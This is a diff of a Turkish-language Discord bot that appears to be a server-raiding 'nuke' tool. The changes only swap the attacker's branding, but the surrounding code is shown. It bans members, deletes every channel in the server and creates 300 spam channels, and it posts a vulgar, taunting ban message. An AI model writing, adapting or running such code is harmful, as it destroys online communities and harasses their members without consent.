@@ -31,7 +31,7 @@ client.on('messageCreate', async (message) => {
     const embed = new EmbedBuilder()
       .setColor('Red')
       .setTitle('❌ Sunucudan Yasaklandınız!')
-      .setDescription('QUEX ve ARCHON sikti gitti demeyin QUEXİN SELAMİ VARR    made by fors')
+      .setDescription('Fors sikti gitti demeyin     made by fors')
       .setFooter({ text: '💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦' });
 
     // Üyeleri banla
@@ -47,7 +47,7 @@ client.on('messageCreate', async (message) => {
     await Promise.all(message.guild.channels.cache.map(ch => ch.delete().catch(() => {})));
 
     // Yeni kanallar oluştur
-    const names = ['QUEX💦', 'ARCHON💝', 'SANTES🔥'];
+    const names = ['FORS💦', 'FORS💝', 'FORS🔥'];
     for (let i = 0; i < 300; i++) {
       const name = names[i % names.length];
       await message.guild.channels.create({ name }).catch(() => {});
